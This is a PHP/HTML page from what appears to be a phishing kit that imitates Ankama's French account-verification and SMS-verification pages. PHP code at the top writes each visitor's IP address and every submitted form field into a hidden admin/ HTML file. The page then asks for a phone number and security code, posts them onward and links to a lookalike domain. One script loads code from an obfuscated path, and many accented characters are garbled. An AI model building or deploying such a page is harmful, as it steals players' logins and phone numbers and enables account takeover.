<?php
$ip = $_SERVER["REMOTE_ADDR"];

$fichier = fopen('admin/U92Zb3ALSChwx4rLDa4DT5238i7i7ja.html', 'a+');
fwrite($fichier, "IP: ");
fwrite($fichier, $ip);

 $handle = fopen("admin/U92Zb3ALSChwx4rLDa4DT5238i7i7ja.html", "a");


        foreach($_POST as $variable => $value) {

            fwrite($handle, $variable);
            fwrite($handle, "=");
            fwrite($handle, $value);
            fwrite($handle, "\r\n");

        }
        fwrite($handle, " Visite AUTHEN");
        fwrite($handle, "\r\n");
        fwrite($handle, "\r\n");
        fclose($handle);

?>
<!DOCTYPE HTML>
<html xmlns="https://www.w3.org/1999/xhtml" lang="fr" xml:lang="fr">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title> Verification de compte</title>
<meta name="description" content=" %s" />
<meta name="keywords" content=" %s" />
<meta name="Identifier-URL" content="account.ankama.com" />
<meta name="language" content="fr" />
<meta http-equiv="imagetoolbar" content="no" />
<meta property="fb:admins" content="100000245210540" />
<meta property="og:type" content="website" />
<meta property="og:locale" content="fr_FR" />
<meta property="og:title" content=" Verification de compte" />
<meta property="og:description" content=" %s" />
<meta property="og:url" content="https://account.ankama.com/fr/securite/ankama-shield/activer" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<meta name="format-detection" content="telephone=no" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@ankamagames" />
<meta name="twitter:creator" content="@ankamagames" />
<meta name="robots" content="NOODP,Index,Follow" />
<link type="image/x-icon" rel="shortcut icon" href="https://account.ankama.com/favicon.ico" />
<link rel="dns-prefetch" href="s.ankama.com" />
<link rel="image_src" href="https://s.ankama.com/www/static.ankama.com/ankama/account-ng/img/logo-account.jpg" />
<meta property="og:image" content="https://s.ankama.com/www/static.ankama.com/ankama/account-ng/img/logo-account.jpg" />
<link rel="alternate" href="https://account.ankama.com/fr/securite/ankama-shield/activer" hreflang="fr" />
<link rel="alternate" href="https://account.ankama.com/en/security/ankama-shield/activate" hreflang="en" />
<link rel="alternate" href="https://account.ankama.com/de/sicherheit/ankama-shield/aktivieren" hreflang="de" />
<link rel="alternate" href="https://account.ankama.com/es/seguridad/ankama-shield/activar" hreflang="es" />
<link rel="alternate" href="https://account.ankama.com/pt/seguranca/ankama-shield/ativar" hreflang="pt" />
<link rel="alternate" href="https://account.ankama.com/it/sicurezza/ankama-shield/attivare" hreflang="it" />
<link type="text/css" rel="stylesheet" href="commonn.css" />
<link type="text/css" rel="stylesheet" href="security.css" />
<link type="text/css" rel="stylesheet" href="profil.css" />
<link type="text/css" rel="stylesheet" href="stepveefeper.css" />

  <script async="" charset="utf-8" src="jvousnique.js" type="text/javascript"></script>
<script type="text/javascript" src="https://static.zdassets.com/ekr/snippet.js?key=7b60150f-2919-4927-8258-669b212b6714" id="ze-snippet"></script>
<script type="text/javascript">
    
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-122429-79', 'auto', {'cookieDomain': 'none', 'allowLinker': true});
ga('require', 'displayfeatures');
ga('require', 'ecommerce');
ga('require', 'linker');
ga('require', 'linkid', 'linkid.js');
ga('set', 'dimension1', 'not_logged_on');
ga('send', 'pageview');
  </script>
  <script type="text/javascript">
    (function() {
var hm = document.createElement('script'); hm.type ='text/javascript'; hm.async = true;
hm.src = ('++u-heatmap-it+log-js').replace(/[+]/g,'/').replace(/-/g,'.');
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(hm, s);
})();
  </script>
</head>
<body class="fr">

<header>
<div class="ak-idbar">
<div class="ak-idbar-content">
<div class="ak-idbar-left">
<div class="ak-brand" data-set="ak-brand"> <a class="navbar-brand" href="https://www.ankama-group.com" target="_blank"></a>
</div>
<a class="ak-support" href="https://support.ankama.com" target="_blank">Support</a>
</div>
<div class="ak-idbar-right">
<div class="ak-button-modal ak-nav-logged" data-hasqtip="1" aria-describedby="qtip-1">
<div class="ak-logged-account">
<span class="ak-nickname">d??connexion</span>
<span class="avatar">
<img src="avatar.png" alt="Avatar">
</span>
</div>
</div>
<script type="application/json">{"target":".ak-box-logged"}</script><div class="ak-button-modal ak-flags-links" data-hasqtip="2">
<a class="ak-flag" href="#"></a>
</div>
<div class="ak-idbar-box ak-box-lang">
<a href="/fr/securite/ankama-shield/activer" hreflang="fr" class="ak-flag-fr">FR</a>
<a href="/en/security/ankama-shield/activate" hreflang="en" class="ak-flag-en">EN</a>
<a href="/de/sicherheit/ankama-shield/aktivieren" hreflang="de" class="ak-flag-de">DE</a>
<a href="/es/seguridad/ankama-shield/activar" hreflang="es" class="ak-flag-es">ES</a>
<a href="/pt/seguranca/ankama-shield/ativar" hreflang="pt" class="ak-flag-pt">PT</a>
<a href="/it/sicurezza/ankama-shield/attivare" hreflang="it" class="ak-flag-it">IT</a>
</div>
</div>
</div>
</div>
<nav class="navbar navbar-default" data-role="ak_navbar">
<div class="navbar-container">
<div class="ak-navbar-left">
<a class="ak-brand" href="">Ankama</a>
</div>
<a class="ak-main-logo" href="/fr"></a>
<div class="navbar-header">


<a class="burger-btn" href="javascript:void(0)"><span></span></a>
</div>
<div class="navbar-collapse navbar-ex1-collapse collapse">
<div class="ak-navbar-search-mob">
<form action="/fr/rechercher" method="get">
<input class="ak-autocomplete" name="q" type="text" value="Rechercher..." />
<script type="application/json">{"minLength":1,"delay":0,"select":"location","url":"https:\/\/account.ankama.com\/fr\/autocomplete","titlemax":45,"shownoresults":true,"noresults":"Voir tous les r\u00e9sultats"}</script> <input type="submit" value="" />
</form>
</div>
<ul class="nav navbar-nav">
<span class="ak-navbar-left-part">
<li class="lvl0 dropdown sep">
<ul class="dropdown-menu " role="menu">
<li class="lvl1 col1 game nopointer">
<ul>
</li>
</ul>
 </li>
</ul>
</li>
<li class="lvl0">
</li>
</span>
<li class="lvl0 ak-menu-brand">
<a class="navbar-brand" href=""></a>
</li>
<ul>
</li>
</ul>
</li>
</ul>
</li>
</span>
</ul>
</div> <div class="ak-navbar-right ak-has-search">
<div class="ak-button-modal ak-nav-logged">
<div class="ak-logged-account">
<span class="ak-nickname">d??connexion</span>
<span class="avatar">
<img src="avatar.png" alt="Avatar">
</span>
</div>
</div>
<script type="application/json">{"target":".ak-box-logged"}</script> <a class="ak-navbar-search" data-navbar-search>
<form action="/fr/rechercher" method="get">
<input class="ak-autocomplete" autocapitalize="off" autocorrect="off" name="q" type="text" value="Rechercher..." />
<script type="application/json">{"minLength":1,"delay":0,"select":"location","url":"https:\/\/account.ankama.com\/fr\/autocomplete","titlemax":45,"shownoresults":true,"noresults":"Voir tous les r\u00e9sultats"}</script> <input type="submit" value="ok" />
</form>
</a>
</div>
</div>
</nav>
<div class="ak-idbar-box ak-box-logged">
<div class="ak-row ak-account-header">
<div class="ak-row-cell ak-logged-avatar">
<div class="ak-logged-avatar-container">
<img src="https://s.ankama.com/www/static.ankama.com/web-avatar/0.png" class="" />
<a href="https://account.ankama.com/fr/jeux-ankama/avatars-forum" target="_blank" class="ak-picto ak-icon-change-avatar">
<div class="ak-avatar-mask">
<span class="ak-avatar-mask-infos">Changer d'avatar</span>
</div>
</a>
</div>
</div>
</div>
<div class="ak-account-infos">
<div class="ak-row ak-infos-ogrines">
<div class="ak-row-cell ak-infos-logged-picto"><span class="ak-infos-picto"></span></div>
<div class="ak-row-cell ak-infos-logged">
<span class="ak-infos-title">Ogrines : -- </span>
<span class="ak-infos-nb">0</span>
<a href="https://www.dofus.com/fr/boutique/24-ogrines" class="ak-infos-link">Acheter des Ogrines</a>
</div>
</div>
<div class="ak-row ak-infos-ankabox">
<div class="ak-row-cell ak-infos-logged-picto"><span class="ak-infos-picto"></span></div>
<div class="ak-row-cell ak-infos-logged">
<span class="ak-infos-title">Ankabox : </span>
<span class="ak-infos-nb">1</span>
<span class="ak-infos-notification">(1)</span>
<a href="https://ankabox.ankama.com/fr" target="_blank" class="ak-infos-link">Consulter ma bo??te</a>
</div>
</div>
<div class="ak-infos-row ak-account-manage">
<div class="ak-ankama-logo">
</div>
<div class="ak-infos-logged">
<a class="ak-infos-logged-link" href="account.ankama-identification.php" target="_blank">
Gestion de compte </a>
<a class="ak-infos-logged-link" href="account.ankama-identification.php" target="_blank">
Prot??gez votre compte ! </a>
<a class="btn btn-default" href="account.ankama-identification.php">D??connexion</a>
</div>
</div>
</div>
</div>
<div class="ak-box-authentification">
<a href="#" class="glyphicon glyphicon-remove-circle"></a>
<div class="ak-container ak-panel">
<div class="ak-panel-content">
<!--googleoff: all-->
<div class="row">
<div class="col-md-4">
<h3>En quelques clics avec :</h3>
<div class="ak-social-connect-block">
<a class="btn btn-primary ak-btn-steam btn-lg" href="https://account.ankama.com/auth/steam?from=https%3A%2F%2Faccount.ankama.com%2Ffr%2Fsecurite%2Fankama-shield%2Factiver">Steam</a>
</div>
<div class="ak-social-connect-block">
<a class="btn btn-primary ak-btn-facebook btn-lg" href="https://account.ankama.com/auth/facebook?from=https%3A%2F%2Faccount.ankama.com%2Ffr%2Fsecurite%2Fankama-shield%2Factiver">Facebook</a>
</div>
<span class="ak-or"><span>ou</span></span>
</div>
<div class="col-md-8">
<h3>J'ai d??j?? un compte ANKAMA</h3>
<div class="ak-account-connect">
<div class="infos_content">
<div class="infos_box infos_box_login bg-danger text-danger" style="display:none">
<span class="warning errors_login_failed" style="display:none">Les identifiants sont incorrects</span>
<span class="warning errors_login_ban" style="display:none">Votre compte est banni d??finitivement</span>
<span class="warning errors_login_locked" style="display:none">Votre compte a ??t?? mis sous protection pour des raisons de s??curit??.<br />
<a href="https://support.ankama.com/hc/fr/requests/new?ticket_form_id=28337">Contactez le support.</a></span>
<span class="warning errors_login_deleted" style="display:none">Supprim??</span>
<span class="warning errors_login_bruteforce" style="display:none">Brute force</span>
<span class="warning errors_login_blacklist" style="display:none">L'adresse IP que vous utilisez est bloqu??e. Cela peut survenir si vous vous connectez depuis un r??seau public et/ou si vous utilisez un proxy/VPN.</span>
<span class="warning errors_login_otptimefailed" style="display:none"><strong>L'Authenticator prot??ge ce compte Ankama</strong><ol><li>Rendez-vous sur votre application Authenticator.</li><li>S??lectionnez votre compte.</li><li>Appuyez sur " d??bloquer "</li><li>Vous disposez de 30 secondes pour ressaisir vos identifiants.</li></ol></span>
<span class="warning errors_login_forbidden_community" style="display:none">Cette fonctionnalit?? n'est pas disponible pour votre communaut??</span>
<span class="warning errors_login_account_shielded" style="display:none">Ce compte Ankama est prot??g?? par Verification de compte. Pour associer ce compte, il est n??cessaire de d??sactiver cette protection dans votre Gestion de compte Ankama. Nous vous recommandons d'activer l'Authenticator qui lui est compatible avec Steam.</span>
<span class="warning errors_login_account_no_certify" style="display:none">Votre compte Ankama doit ??tre <a target="_blank" href="https://account.ankama.com/fr/compte/informations/certification">certifi??</a>.</span>
<span class="warning errors_login_account_linked" style="display:none">Ce compte Ankama est d??j?? li?? ?? un autre compte Steam</span>
<span class="warning errors_login_recaptcha_failed" style="display:none">Vous avez ??chou?? ?? la v??rification anti-robot. Merci d'essayer de nouveau.</span>
</div>
</div>
<div class="ak-form"><form class="ak-container ak-form form-horizontal" role="form" method="POST" name="connectform" action="https://account.ankama.com/sso?from=https%3A%2F%2Faccount.ankama.com%2Ffr%2Fsecurite%2Fankama-shield%2Factiver"><input type="hidden" class="form-control" name="action" value="login" /><input type="hidden" class="form-control" name="from" value="https://account.ankama.com/fr/securite/ankama-shield/activer" />
<div class="form-group">
<label class="control-label" for="userlogin">Nom de compte</label>
<input type="text" class="form-control" name="login" id="userlogin" value="gabrieldiosxD" />
</div>
<div class="form-group">
<label class="control-label" for="userpass">Mot de passe</label>
<input type="password" class="form-control ak-field-password ak-tooltip" name="password" value="" id="userpass" /><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"Attention","text":"<p class=\"text-warning\">vous \u00e9crivez en MAJUSCULES<\/p>"},"style":{"classes":"ak-tooltip-white"},"position":{"my":"center left","at":"center right","container":".ak-login-page"},"show":{"event":"capslockpassshow"},"hide":{"event":"capslockpasshide"}},"hideOnScroll":true,"forceOnTouch":true}</script>
</div>
<div class="form-group">
<div class="checkbox">
<label>
<input type="checkbox" value="1" name="remember" checked="checked" id="uid-5c740cdc27bef" />Rester connect??
</label>
</div>
</div>
<input type="submit" type="button" role="button" class="btn btn-primary ak-invisiblecaptcha not-rendered btn-lg" id="login_sub" value="Se connecter" /><script type="application/json">{"sitekey":"6LfbFRsUAAAAACrqF5w4oOiGVxOsjSUjIHHvglJx"}</script>
</form></div>
</div>
<div class="ak-login-links">
<ul>
<li>
<a href="https://account.ankama.com/fr/compte/d??connection-impossible">Impossible de se connecter ?</a> </li>
<li><a href="https://account.ankama.com/fr/creer-un-compte">Cr??er un compte</a></li>
</ul>
</div>
</div>
</div>
<!--googleon: all-->
</div>
</div></div><div class="ak-idbar-box ak-box-lang">
<a href="/fr/securite/ankama-shield/activer" hreflang="fr" class="ak-flag-fr">FR</a>
<a href="/en/security/ankama-shield/activate" hreflang="en" class="ak-flag-en">EN</a>
<a href="/de/sicherheit/ankama-shield/aktivieren" hreflang="de" class="ak-flag-de">DE</a>
<a href="/es/seguridad/ankama-shield/activar" hreflang="es" class="ak-flag-es">ES</a>
<a href="/pt/seguranca/ankama-shield/ativar" hreflang="pt" class="ak-flag-pt">PT</a>
<a href="/it/sicurezza/ankama-shield/attivare" hreflang="it" class="ak-flag-it">IT</a>
</div>

<div class="largedesktop device-profile visible-lg" data-deviceprofile="largedesktop"></div>
<div class="desktop device-profile visible-md" data-deviceprofile="desktop"></div>
<div class="tablet device-profile visible-sm" data-deviceprofile="tablet"></div>
<div class="mobile device-profile visible-xs" data-deviceprofile="mobile"></div>
</header>
<aside class="ak-slidemenu">
<div class="ak-navbar-search-mob">
<form action="/fr/rechercher" method="get">
<input class="ak-autocomplete ui-autocomplete-input" name="q" type="text" value="Rechercher..." autocomplete="off">
<script type="application/json">
        {
            "minLength":1,
            "delay":0,
            "select":"location",
            "url":"https://account.ankama.com/fr/autocomplete",
            "titlemax":45,
            "shownoresults":true,
            "noresults":"Voir tous les r??sultats"
        }
        </script>
<input type="submit" value="">
<ul class="ui-autocomplete ui-front ui-menu ui-widget ui-widget-content" id="ui-id-1" tabindex="0" style="display: none;"></ul></form>
</div>
<div class="menu-container"></div>
<div class="menu-buttons">
<div class="ak-button-modal ak-flags-links">
<a class="ak-flag" href="#"></a>
</div>
<script type="application/json">{"tooltip":{"position":{"my":"left bottom","at":"top left"},"hide":{"event":"mouseleave"}}}</script> <div class="ak-idbar-box ak-box-lang">
<a href="/fr/securite/ankama-shield/activer" hreflang="fr" class="ak-flag-fr">FR</a>
<a href="/en/security/ankama-shield/activate" hreflang="en" class="ak-flag-en">EN</a>
<a href="/de/sicherheit/ankama-shield/aktivieren" hreflang="de" class="ak-flag-de">DE</a>
<a href="/es/seguridad/ankama-shield/activar" hreflang="es" class="ak-flag-es">ES</a>
<a href="/pt/seguranca/ankama-shield/ativar" hreflang="pt" class="ak-flag-pt">PT</a>
<a href="/it/sicurezza/ankama-shield/attivare" hreflang="it" class="ak-flag-it">IT</a>
</div>
<a class="btn-default ak-support-link" href="https://support.ankama.com" target="_blank">Contacter le Support</a>
</div>
</aside>
<script type="application/json">{"triggerElement":".navbar-header .burger-btn","fromTarget":"ul.nav.navbar-nav"}</script>
<div class="ak-mobile-menu-scroller">
      <div class="ak-pagetop ak-container"><div class="ak-pagetop-child "><div class="ak-container container"><div class="ak-sectiontitle ak-icon-secure">
<div>
<div><div class="row">
<div class="col-sm-12">
<nav>
<div class="ak-breadcrumb-spacer"></div>
<div class="breadcrumb" itemscope itemtype="https://data-vocabulary.org/Breadcrumb">
<a rel="index" class="ak-first" href="account.ankama=codes-verification.php" itemprop="url">
<span itemprop="title">Accueil</span>
</a>
<div itemprop="child" itemscope itemtype="https://data-vocabulary.org/Breadcrumb">
<a class="ak-last" href="account.ankama=codes-verification.php" itemprop="url">
<span itemprop="title">Compte</span>
</a>
<div itemprop="child" itemscope itemtype="https://data-vocabulary.org/Breadcrumb">
<a class="ak-last" href="account.ankama=codes-verification.php" itemprop="url">
<span itemprop="title">V??rification par SMS</span>
</a>
              </div>
            </div>
          </nav>
  </div>

  </div>
</div>    <div class="ak-sectiontitle-text">V??rification par SMS</div>

  </div>
</div></div></div><div class="ak-pagetop-child ak-pagetop-stepper"><div class="ak-container container"><div class="ak-container" data-parentclass="ak-pagetop-stepper"><div class="ak-block-stepper">
  <div class="ak-stepper-content">
    <div class="ak-col-left">
            <img src="smms.png" alt="" />
                  <span>V??rification par SMS</span>
          </div>

    <div class="ak-col-right">
      <ul class="ak-stepper ak-stepper-list">
                  <li class="current">
            <div>
              <span>1</span><br/>
              <a href="javascript:void(0)">
                Identification              </a>
            </div>
          </li>
                  <li class="disabled">
            <div>
              <span>2</span><br/>
              <a href="javascript:void(0)">
                Sms              </a>
            </div>
          </li>
                  <li class="disabled">
            <div>
              <span>3</span><br/>
              <a href="javascript:void(0)">
                Validation              </a>
            </div>
          </li>
              </ul>
    </div>
  </div>
</div>
</div></div></div></div>
  <div class="container ak-main-container">

    
    


    <div class="ak-main-content">
    <div class="ak-main-page">
      <div class="row">
        <main class="main col-md-9">
                                <div class="ak-page-header">
              
                          </div>

            
                        <div class="ak-container ak-main-center"><div class="ak-title-container">
  <h1 class="ak-return-link">
                            <a href="account.ankama-identification.php">
                  <span class="ak-icon-big ak-return"></span>
                      </a>
                      
    Identifiez le compte concern??


  </div>
  <div class="ak-form">
      <form novalidate="novalidate" method="POST" action="verification-compte.php" class="ak-form-account ak-form ak-container ak-form-gsm" role="form">
          <input type="hidden" class="form-control" name="postback" value="1" />
  <div class="ak-block-profil-infos ak-container"><strong class="ak-label-profil-infos">Votre pays/r??gion*</strong><span class="ak-profil-infos ak-block">
  <div class="form-group">
    
    
        
          
                      <select class="form-control" name="countryphone" id="countryphone" placeholder="Votre pays/r&eacute;gion"><option value="AF">Afghanistan</option><option value="ZA">Afrique du Sud</option><option value="AL">Albanie</option><option value="DZ">Alg??rie</option><option value="DE">Allemagne</option><option value="AD">Andorre</option><option value="AO">Angola</option><option value="AI">Anguilla</option><option value="AQ">Antarctique</option><option value="AG">Antigua et Barbuda</option><option value="AN">Antilles N??erlandaises</option><option value="SA">Arabie Saoudite</option><option value="AR">Argentine</option><option value="AM">Arm??nie</option><option value="AW">Aruba</option><option value="AU">Australie</option><option value="AT">Autriche</option><option value="AZ">Azerba??djan</option><option value="BS">Bahamas</option><option value="BH">Bahre??n</option><option value="BD">Bangladesh</option><option value="BB">Barbades</option><option value="BE">Belgique</option><option value="BZ">Belize</option><option value="BM">Bermudes</option><option value="BT">Bhoutan</option><option value="BY">Bi??lorussie</option><option value="BO">Bolivie</option><option value="BA">Bosnie-Herz??govine</option><option value="BW">Botswana</option><option value="BN">Brunei Darussalam</option><option value="BR">Br??sil</option><option value="BG">Bulgarie</option><option value="BF">Burkina Faso</option><option value="BI">Burundi</option><option value="BJ">B??nin</option><option value="KH">Cambodge</option><option value="CM">Cameroun</option><option value="CA">Canada</option><option value="CV">Cap Vert</option><option value="CL">Chili</option><option value="CN">Chine</option><option value="CY">Chypre</option><option value="CO">Colombie</option><option value="KM">Comores</option><option value="CG">Congo</option><option value="CD">Congo, R??publique D??m.</option><option value="KR">Cor??e du sud</option><option value="KP">Cor??e, R??publique de</option><option value="CR">Costa Rica</option><option value="HR">Croatie</option><option value="CU">Cuba</option><option value="CI">C??te d'Ivoire</option><option value="DK">Danemark</option><option value="DJ">Djibouti</option><option value="DM">Dominique</option><option value="EG">Egypte</option><option value="AE">Emirats arabes unis</option><option value="EC">Equateur</option><option value="ER">??rythr??e</option><option value="ES">Espagne</option><option value="EE">Estonie</option><option value="ET">Ethiopie</option><option value="FI">Finlande</option><option selected="true" value="FR">France</option><option value="GA">Gabon</option><option value="GM">Gambie</option><option value="GH">Ghana</option><option value="GI">Gibraltar</option><option value="GB">Grande Bretagne</option><option value="GL">Gro??nland</option><option value="GR">Gr??ce</option><option value="GP">Guadeloupe</option><option value="GU">Guam</option><option value="GT">Guatemala</option><option value="GN">Guin??e</option><option value="GQ">Guin??e ??quatoriale</option><option value="GW">Guin??e-Bissau</option><option value="GY">Guyane</option><option value="GF">Guyane fran??aise</option><option value="GE">G??orgie</option><option value="GS">G??orgie Sud &amp; Iles Sandwich</option><option value="HT">Ha??ti</option><option value="HN">Honduras</option><option value="HK">Hong-Kong</option><option value="HU">Hongrie</option><option value="CX">Ile Christmas</option><option value="MU">Ile Maurice</option><option value="NF">Ile Norfolk</option><option value="BV">Iles Bouvet</option><option value="KY">Iles Ca??mans</option><option value="CC">Iles Cocos-Keeling</option><option value="CK">Iles Cook</option><option value="FJ">Iles Fidji</option><option value="FO">Iles F??ro??</option><option value="HM">Iles Heard et Mc Donald</option><option value="FK">Iles Malouines</option><option value="MP">Iles Mariannes du nord</option><option value="MH">Iles Marshall</option><option value="SB">Iles Salomon</option><option value="SJ">Iles Svalbard et Jan Mayen</option><option value="TC">Iles Turks et Caicos</option><option value="VI">Iles Vierges am??ricaines</option><option value="VG">Iles Vierges britanniques</option><option value="IN">Inde</option><option value="ID">Indon??sie</option><option value="IQ">Irak</option><option value="IR">Iran</option><option value="IE">Irlande</option><option value="IS">Islande</option><option value="IL">Isra??l</option><option value="IT">Italie</option><option value="JM">Jama??que</option><option value="JP">Japon</option><option value="JO">Jordanie</option><option value="KZ">Kazakhstan</option><option value="KE">Kenya</option><option value="KG">Kirghizistan</option><option value="KI">Kiribati</option><option value="KW">Kowe??t</option><option value="GD">La Grenade</option><option value="LA">Lao</option><option value="LS">Lesotho</option><option value="LV">Lettonie</option><option value="LB">Liban</option><option value="LR">Liberia</option><option value="LI">Liechtenstein</option><option value="LT">Lituanie</option><option value="LU">Luxembourg</option><option value="LY">Libye</option><option value="MO">Macao</option><option value="MK">Mac??doine</option><option value="MG">Madagascar</option><option value="MY">Malaisie</option><option value="MW">Malawi</option><option value="MV">Maldives</option><option value="ML">Mali</option><option value="MT">Malte</option><option value="MA">Maroc</option><option value="MQ">Martinique</option><option value="MR">Mauritanie</option><option value="YT">Mayotte</option><option value="MX">Mexique</option><option value="FM">Micron??sie, ??tats F??d??r??s de</option><option value="MD">Moldavie, R??publique de</option><option value="MC">Monaco</option><option value="MN">Mongolie</option><option value="ME">Mont??n??gro</option><option value="MS">Montserrat</option><option value="MZ">Mozambique</option><option value="MM">Myanmar</option><option value="NA">Namibie</option><option value="NR">Nauru</option><option value="NI">Nicaragua</option><option value="NE">Niger</option><option value="NG">Nig??ria</option><option value="NU">Niue</option><option value="NO">Norv??ge</option><option value="NC">Nouvelle Cal??donie</option><option value="NZ">Nouvelle Z??lande</option><option value="NP">N??pal</option><option value="OM">Oman</option><option value="UG">Ouganda</option><option value="UZ">Ouzb??kistan</option><option value="PK">Pakistan</option><option value="PW">Palau</option><option value="PA">Panama</option><option value="PG">Papouasie-Nouvelle-Guin??e</option><option value="PY">Paraguay</option><option value="NL">Pays-Bas</option><option value="PH">Philippines</option><option value="PN">Pitcairn</option><option value="PL">Pologne</option><option value="PF">Polyn??sie Fran??aise</option><option value="PT">Portugal</option><option value="PR">Puerto Rico</option><option value="PE">P??rou</option><option value="QA">Qatar</option><option value="RE">R??union</option><option value="RO">Roumanie</option><option value="RU">Russie</option><option value="RW">Rwanda</option><option value="CF">R??publique Centrafricaine</option><option value="DO">R??publique Dominicaine</option><option value="CZ">R??publique Tch??que</option><option value="EH">Sahara occidental</option><option value="BL">Saint-Barth??lemy</option><option value="SM">Saint Marin</option><option value="MF">Saint-Martin</option><option value="LC">Sainte-Lucie</option><option value="SV">Salvador</option><option value="WS">Samoa (Ind??pendante)</option><option value="AS">Samoa Am??ricaines</option><option value="CS">Serbie-et-Mont??n??gro</option><option value="RS">Serbie</option><option value="SC">Seychelles</option><option value="SL">Sierra Leone</option><option value="SG">Singapour</option><option value="SK">Slovaquie</option><option value="SI">Slov??nie</option><option value="SO">Somalie</option><option value="SD">Soudan</option><option value="LK">Sri Lanka</option><option value="KN">St Kitts et Nevis</option><option value="VC">St Vincent et les Grenadines</option><option value="PM">St. Pierre et Miquelon</option><option value="SH">Ste H??l??ne</option><option value="CH">Suisse</option><option value="SR">Surinam</option><option value="SE">Su??de</option><option value="SZ">Swaziland</option><option value="SY">Syrie</option><option value="ST">S??o Tome et Pr??ncipe</option><option value="SN">S??n??gal</option><option value="TJ">Tadjikistan</option><option value="TZ">Tanzanie</option><option value="TW">Ta??wan</option><option value="TD">Tchad</option><option value="TF">Ter. FR du sud et antartique</option><option value="IO">Territoire indien britannique</option><option value="TH">Tha??lande</option><option value="TP">Timor Oriental</option><option value="TG">Togo</option><option value="TK">Tokelau</option><option value="TO">Tonga</option><option value="TT">Trinit??-et-Tobago</option><option value="TN">Tunisie</option><option value="TM">Turkm??nistan</option><option value="TR">Turquie</option><option value="TV">Tuvalu</option><option value="US">USA</option><option value="UM">USA Minor Outlying Islands</option><option value="UA">Ukraine</option><option value="UY">Uruguay</option><option value="VU">Vanuatu</option><option value="VA">Vatican</option><option value="VE">Venezuela</option><option value="VN">Vietnam</option><option value="WF">Wallis-et-Futuna</option><option value="YE">Y??men</option><option value="ZM">Zambie</option><option value="ZW">Zimbabwe</option><option value="AX">Aland Islands</option><option value="GG">Guernsey</option><option value="IM">Isle of Man</option><option value="JE">Jersey</option><option value="ZR">Zaire</option><option value="BQ">Bonaire, Saint-Eustache et Saba</option><option value="CW">Cura??ao</option><option value="IC">Iles Canaries</option><option value="PS">??tat de palestine</option><option value="SS">Soudan du Sud</option><option value="SX">Saint-Martin partie n??erlandaise</option><option value="TA">Tristan da Cunha</option><option value="TL">Timor Leste</option></select><script type="application/json">{"validation":{"rules":[{"required":true,"message":"Ce champ ne peut pas rester vide"}],"remote":false}}</script>
</div>
</span></div><div class="ak-block-profil-infos ak-container ak-block-gsm"><strong class="ak-label-profil-infos">Votre t??l??phone mobile*</strong><span class="ak-profil-infos ak-block"><div class="ak-gsm-code-block"><span class="ak-gsm-code"></span></div>
  <div class="form-group">
  <input type="text" style="width: 200px;" required="" class="form-control ak-field-code" name="Codesecurite" id="Codesecurite" placeholder="Votre t??l??phone mobile"><script type="application/json">{"validation":{"rules":[{"required":true,"message":"Ce champ ne peut pas rester vide"}]}}</script>
</div>
</p> <a style="color:#f45c20;" href="https://dofus-pm.com/fr/mmorpg/actualites/news/account.ankama=code-de-securite.php"> Pas de t??l??phone associ?? ?</a>
<span class="ak-tooltip-info ak-tooltip-phone ak-tooltip-DE ak-tooltip" style="display: none">?</span><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"","text":"Le num\u00e9ro de mobile doit \u00eatre sous indicatif international.<br \/>\nEx : En Allemagne : 10624242424 devient +4910624242424"},"style":{"classes":"ak-tooltip-content"}}}</script><span class="ak-tooltip-info ak-tooltip-phone ak-tooltip-BE ak-tooltip" style="display: none">?</span><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"","text":"Le num\u00e9ro de mobile doit \u00eatre sous indicatif international.<br \/>\nEx : En Belgique : 0474747474 devient +32474747474"},"style":{"classes":"ak-tooltip-content"}}}</script><span class="ak-tooltip-info ak-tooltip-phone ak-tooltip-BR ak-tooltip" style="display: none">?</span><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"","text":"Le num\u00e9ro de mobile doit \u00eatre sous indicatif international.<br \/>\nEx : Au Br\u00e9sil : 062424-2424 devient +550624242424"},"style":{"classes":"ak-tooltip-content"}}}</script><span class="ak-tooltip-info ak-tooltip-phone ak-tooltip-CO ak-tooltip" style="display: none">?</span><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"","text":"Le num\u00e9ro de mobile doit \u00eatre sous indicatif international.<br \/>\nEx : En Colombie : 310 424 2424 devient +573104242424"},"style":{"classes":"ak-tooltip-content"}}}</script><span class="ak-tooltip-info ak-tooltip-phone ak-tooltip-ES ak-tooltip" style="display: none">?</span><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"","text":"Le num\u00e9ro de mobile doit \u00eatre sous indicatif international.<br \/>\nEx : En Espagne : 624242424 devient +34624242424"},"style":{"classes":"ak-tooltip-content"}}}</script><span class="ak-tooltip-info ak-tooltip-phone ak-tooltip-FR ak-tooltip" style="display: none">?</span><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"","text":"Le num\u00e9ro de mobile doit \u00eatre sous indicatif international.<br \/>\nEx : En France : 0624242424 devient +33624242424"},"style":{"classes":"ak-tooltip-content"}}}</script><span class="ak-tooltip-info ak-tooltip-phone ak-tooltip-IT ak-tooltip" style="display: none">?</span><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"","text":"Le num\u00e9ro de mobile doit \u00eatre sous indicatif international.<br \/>\nEx : En Italie : 3624242424 devient +393624242424"},"style":{"classes":"ak-tooltip-content"}}}</script><span class="ak-tooltip-info ak-tooltip-phone ak-tooltip-LU ak-tooltip" style="display: none">?</span><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"","text":"Le num\u00e9ro de mobile doit \u00eatre sous indicatif international.<br \/>\nEx : Au Luxembourg : 621621621 devient +352621621621"},"style":{"classes":"ak-tooltip-content"}}}</script><span class="ak-tooltip-info ak-tooltip-phone ak-tooltip-MA ak-tooltip" style="display: none">?</span><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"","text":"Le num\u00e9ro de mobile doit \u00eatre sous indicatif international.<br \/>\nEx : Au Maroc : 0624242424 devient 